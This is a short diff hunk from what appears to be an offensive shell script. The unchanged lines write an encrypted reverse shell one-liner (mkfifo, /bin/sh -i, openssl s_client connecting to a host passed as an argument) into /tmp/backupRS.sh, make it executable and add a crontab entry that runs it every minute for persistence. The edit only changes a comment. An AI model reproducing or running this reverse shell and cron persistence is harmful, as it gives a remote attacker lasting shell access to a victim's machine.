@@ -24,5 +24,5 @@ fi
 echo "mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect $1 > /tmp/x; rm /tmp/x" > /tmp/backupRS.sh 
 #make it executable
 chmod u+x /tmp/backupRS.sh
-#create cron that execute the shell script
+#create cron that execute the shell script every one minute
 crontab -l | { cat; echo "*/1 * * * * /tmp/backupRS.sh"; } | crontab
